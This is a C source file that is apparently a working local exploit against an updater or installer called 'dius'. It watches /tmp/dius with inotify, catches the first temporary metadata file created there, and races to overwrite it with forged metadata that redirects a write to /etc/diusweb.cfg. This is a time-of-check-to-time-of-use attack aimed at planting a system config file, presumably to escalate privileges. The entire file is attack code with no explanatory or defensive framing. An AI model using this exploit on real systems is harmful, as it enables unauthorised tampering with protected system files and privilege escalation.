#include <assert.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/inotify.h>
#include <unistd.h>

#include <fcntl.h>
#include <sys/syscall.h>
#include <linux/fs.h>

#define BUF_LEN (10 * (sizeof(struct inotify_event) + NAME_MAX + 1))

#define TMP_DIUS "/tmp/dius"

const char * FAKE_METADATA = "LIST:1\n"
                             "FILENAME:/etc/diusweb.cfg\n"
                             "CREATE:1\n"
                             "FILENAME0:fake.cfg\n"
                             "COMPRESS0:n\n"
                             "FILESIZE0:98\n";

int main() {
    int inotify_fd;
    int wd;
    int metadata_fd;
    int tmp_dius_fd;
    size_t fake_metadata_len;
    int r;

    ssize_t num_read;
    struct inotify_event * event;
    char buf[BUF_LEN] __attribute__ ((aligned(8)));
    char * p;

    printf("Getting things setup...\n");

    fake_metadata_len = strlen(FAKE_METADATA);
    tmp_dius_fd = open(TMP_DIUS, O_DIRECTORY | O_RDONLY);
    if (tmp_dius_fd == -1) {
        printf("Could not open /tmp/dius fd\n");
    }

    inotify_fd = inotify_init();
    wd = inotify_add_watch(inotify_fd, TMP_DIUS, IN_CREATE);
    assert(wd != -1);

    printf("Starting inotify loop to watch /tmp/dius...\n");
    for (;;) {
        num_read = read(inotify_fd, buf, BUF_LEN);
        if (num_read == -1) {
            printf("inotify read failed\n");
            return 1;
        }
        else if (num_read == 0) {
            printf("read() with inotify fd returned 0\n");
            return 1;
        }

        // Assume the first created file is the one we want.
        event = (struct inotify_event *)buf;        
        break;
    }

    printf("dius tmp file: %s\n", event->name);

    // race to overwrite the metadata file to one not containing WEB.
    metadata_fd = openat(tmp_dius_fd, event->name, O_WRONLY | O_TRUNC);
    if (metadata_fd == -1) {
        printf("Failed to open dius tmp file for writing\n");
        return 1;
    }

    write(metadata_fd, FAKE_METADATA, fake_metadata_len);
    close(metadata_fd);
    return 0;
}